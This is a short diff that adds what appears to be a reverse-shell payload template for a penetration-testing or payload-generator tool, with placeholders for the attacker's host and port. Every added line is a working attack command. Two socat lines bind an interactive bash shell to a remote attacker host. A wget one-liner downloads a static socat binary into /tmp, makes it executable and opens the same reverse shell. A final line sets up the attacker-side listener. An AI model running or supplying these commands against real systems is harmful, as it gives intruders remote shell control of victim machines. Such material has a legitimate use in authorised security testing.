@@ -1,0 +1,8 @@
+/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:#{LHOST}:#{LPORT}
+
+socat tcp-connect:#{LHOST}:#{LPORT} exec:"bash -li",pty,stderr,setsid,sigint,sane
+
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:#{LHOST}:#{LPORT}
+
+# desc: Listener (attacker) 
+socat file:`tty`,raw,echo=0 TCP-L:#{LPORT}
